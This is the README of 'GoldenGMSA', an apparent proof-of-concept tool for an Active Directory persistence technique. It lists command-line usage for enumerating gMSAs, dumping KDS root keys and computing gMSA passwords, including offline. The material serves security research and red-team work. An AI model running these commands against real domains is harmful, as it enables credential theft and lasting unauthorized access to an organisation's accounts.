# GoldenGMSA
PoC of GoldenGMSA - persistence techinque that abuses the gMSA's mechanism to generate password on demand.
Technical article can be found in Semperis's Blog

Usage:

Get basic information on all gMSAs in the domain (including GUID of associated KDS root key and msds-managedpasswordID):
GoldenGMSA --info

Get basic information on a specific gMSA based on the SID (including GUID of associated KDS root key and msds-managedpasswordID):
GoldenGMSA --info <gMSA SID>

Dump a specific KDS root key, specified by GUID in base64 format:
GoldenGMSA --dump-key <KDS Root Key GUID>

Generate a gMSA's password. Require Domain Admin privileges:
GoldenGMSA --generate-password --sid <gMSA SID>

Generate a gMSA's password. Require normal domain user and base64 of the relevant KDS root key:
GoldenGMSA --generate-password --sid <gMSA SID> --key <base64 RootKey>

Generate a gMSA's password. Offline mode - require base64 of the relevant KDS root key and an up to date base64 of msds-ManagedPasswordID:
GoldenGMSA --generate-password --sid <gMSA SID> --key <base64 RootKey> --passwordid <base64 ManagedPasswordID>
